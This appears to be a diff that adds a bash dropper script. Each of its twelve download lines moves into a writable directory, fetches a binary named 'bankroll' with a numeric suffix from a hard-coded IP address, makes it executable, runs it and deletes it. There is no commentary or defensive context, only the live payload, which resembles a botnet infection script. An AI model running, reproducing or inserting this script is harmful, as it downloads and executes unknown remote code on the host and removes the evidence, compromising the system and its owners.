@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll; chmod +x bankroll; ./bankroll; rm -rf bankroll
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll2; chmod +x bankroll2; ./bankroll2; rm -rf bankroll2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll3; chmod +x bankroll3; ./bankroll3; rm -rf bankroll3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll4; chmod +x bankroll4; ./bankroll4; rm -rf bankroll4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll5; chmod +x bankroll5; ./bankroll5; rm -rf bankroll5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll6; chmod +x bankroll6; ./bankroll6; rm -rf bankroll6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll7; chmod +x bankroll7; ./bankroll7; rm -rf bankroll7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll8; chmod +x bankroll8; ./bankroll8; rm -rf bankroll8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll9; chmod +x bankroll9; ./bankroll9; rm -rf bankroll9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll10; chmod +x bankroll10; ./bankroll10; rm -rf bankroll10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll11; chmod +x bankroll11; ./bankroll11; rm -rf bankroll11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.171.92/bankroll12; chmod +x bankroll12; ./bankroll12; rm -rf bankroll12
